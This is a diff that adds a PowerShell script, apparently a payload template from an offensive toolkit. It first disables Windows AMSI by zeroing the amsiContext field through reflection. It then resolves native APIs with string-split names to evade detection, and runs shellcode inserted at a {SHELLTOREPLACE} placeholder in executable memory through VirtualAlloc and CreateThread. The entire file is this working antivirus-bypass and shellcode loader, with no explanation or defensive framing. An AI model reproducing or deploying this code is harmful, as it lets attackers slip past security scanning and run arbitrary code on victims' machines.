@@ -1,0 +1,65 @@
+﻿function lukni {
+
+    Param($modName, $funcName)
+    $assembly = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
+                    $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('Sy'+'stem.dll') }).GetType('Microsoft.Wi'+'n32.UnsafeNativeMethods')
+    $tmp = @()
+    $assembly.GetMethods() | ForEach-Object {
+        if($_.Name -eq "GetPro"+"cAddress") {$tmp += $_}
+    }
+    return $tmp[0].Invoke($null, @(($assembly.GetMethod('Get'+'Module'+'Handle')).Invoke($null, @($modName)), $funcName))
+}
+
+
+function getDelegateType() {
+    Param(
+            [Parameter(Position = 0, Mandatory = $true)] [Type[]] $funcArguments,
+            [Parameter(Position = 1)] [Type] $retType = [Void])
+    
+    $type = ([AppDomain]::CurrentDomain).DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+                        DefineDynamicModule('InMemoryModule', $false).
+                        DefineType('MyDelegateType','Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+
+    $type.DefineConstructor('RTSpecialName, HideBySig, Public',
+                             [System.Reflection.CallingConventions]::Standard,
+                             $funcArguments).SetImplementationFlags('RunTime, Managed')
+    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $funcArguments).SetImplementationFlags('RunTime, Managed')
+
+    return $type.CreateType()
+}
+
+$a = [Ref].Assembly.GetTypes()
+$obj = $null
+foreach($b in $a) {
+    if ($obj -ne $null) {
+        break
+    }
+    if ($b.Name -like "*iUtils") {
+        $c = $b.GetFields('NonPublic, Static')
+        foreach($d in $c) {
+            if ($d.Name -like "*Context") {
+                $obj = $d.GetValue($null)
+                break
+            }
+        }
+    }
+}
+[IntPtr]$ptr = $obj
+[Int32[]]$buf = @(0)
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+{SHELLTOREPLACE}
+
+$size = $buf.Length
+
+$retPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lukni kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr],[UInt32],[UInt32],[UInt32]) ([IntPtr]))).
+        Invoke([IntPtr]::Zero, $size, 0x3000, 0x40)
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $retPtr, $buf.Length)
+
+$thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lukni kernel32.dll CreateThread), (getDelegateType @([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32], [IntPtr]) ([IntPtr]))).
+        Invoke([IntPtr]::Zero, 0, $retPtr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+        
+$thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lukni kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).
+        Invoke($thread, 0xFFFFFFFF)
